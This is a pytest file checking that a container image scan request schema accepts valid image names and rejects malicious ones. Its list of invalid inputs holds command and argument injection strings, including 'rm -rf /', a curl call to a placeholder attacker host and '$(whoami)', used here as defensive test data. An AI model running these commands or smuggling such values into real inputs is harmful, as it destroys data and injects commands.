import pytest
from pydantic import ValidationError
from v2.models.schemas import ImageScanRequest

VALID_IMAGE_NAMES = [
    "nginx",
    "nginx:1.25-alpine",
    "nginx:latest",
    "library/nginx:1.25",
    "123456789012.dkr.ecr.us-east-1.amazonaws.com/my-repo:v1",
    "nginx@sha256:" + "a" * 64,
]

INVALID_IMAGE_NAMES = [
    "-rm",  # leading '-' parsed as a CLI flag (argument injection)
    "--config=/etc/passwd",
    "; rm -rf /",
    "nginx && curl evil.com",
    "nginx | tee /etc/passwd",
    "",
    "nginx:$(whoami)",
]


@pytest.mark.parametrize("image_name", VALID_IMAGE_NAMES)
def test_valid_image_names_accepted(image_name):
    req = ImageScanRequest(image_name=image_name)
    assert req.image_name == image_name


@pytest.mark.parametrize("image_name", INVALID_IMAGE_NAMES)
def test_invalid_image_names_rejected(image_name):
    with pytest.raises(ValidationError):
        ImageScanRequest(image_name=image_name)
